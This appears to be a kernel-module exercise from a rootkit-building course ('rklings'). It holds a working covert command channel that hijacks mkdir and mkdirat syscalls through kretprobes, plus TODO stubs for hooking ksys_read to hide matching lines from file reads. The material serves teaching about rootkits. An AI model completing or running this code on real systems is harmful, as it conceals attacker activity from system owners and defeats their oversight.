// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/ptrace.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128
#define RK_TARGET_MAX 32
#define RK_NAME_MAX   64

struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

static struct rk_target_list content_targets;

// TODO: rk_target_add (strscpy into targets[count], return -ENOSPC if full)
// TODO: rk_target_remove (validate idx, memmove to close gap)
// TODO: line_matches (strnstr loop, return true if any target found in line)

static int rk_target_add(struct rk_target_list *list, const char *name)
{
	return -ENOSYS;
}

static int rk_target_remove(struct rk_target_list *list, int idx)
{
	return -ENOSYS;
}

/* ---- ksys_read interception ---- */

struct read_data {
	void __user *ubuf;
	size_t count;
};

static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	// TODO: save ubuf and count from direct regs (NOT inner pt_regs)
	return 0;
}

static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	// TODO: copy buffer, walk lines by memchr '\n', memmove out matches, write back
	return 0;
}

static struct kretprobe read_probe = {
    .handler = read_return,
    .entry_handler = read_entry,
    .data_size = sizeof(struct read_data),
    .maxactive = 20,
    .kp.symbol_name = "ksys_read",
};

/* ---- mkdir command dispatcher (provided) ---- */

typedef int (*rk_handler_t)(const char *arg);

struct rk_cmd_entry {
	const char *key;
	rk_handler_t handler;
};

static int cmd_hide_content(const char *arg)   { return rk_target_add(&content_targets, arg); }
static int cmd_unhide_content(const char *arg) { int i; return kstrtoint(arg, 10, &i) == 0 ? rk_target_remove(&content_targets, i) : -EINVAL; }

static const struct rk_cmd_entry cmd_table[] = {
	{ "h.c", cmd_hide_content },
	{ "u.c", cmd_unhide_content },
};

static int rk_dispatch(const char *name)
{
	const struct rk_cmd_entry *best = NULL;
	int best_len = 0;
	const char *arg;
	int i;

	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
		int klen = strlen(cmd_table[i].key);

		if (strncmp(name, cmd_table[i].key, klen) != 0)
			continue;
		if (name[klen] != '\0' && name[klen] != '.')
			continue;
		if (klen > best_len) {
			best = &cmd_table[i];
			best_len = klen;
		}
	}

	if (!best)
		return -ENOENT;

	arg = name[best_len] == '.' ? name + best_len + 1 : NULL;
	return best->handler(arg);
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_do_entry(struct kretprobe_instance *inst,
			     const char __user *pathname)
{
	struct rk_mkdir_data *data;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base + RK_PREFIX_LEN);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_entry_mkdir(struct kretprobe_instance *inst,
				struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->di);
}

static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
				  struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_mkdir_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = rk_mkdir_entry_mkdir,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

static struct kretprobe rk_mkdirat_probe = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = rk_mkdir_entry_mkdirat,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

/* ---- module lifecycle ---- */

static int __init rk_init(void)
{
	int ret;

	spin_lock_init(&content_targets.lock);

	// TODO: register read + mkdir probes with goto rollback, pr_info loaded

	return 0;
}

static void __exit rk_exit(void)
{
	// TODO: unregister probes in reverse, pr_info unloaded
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings content filter");
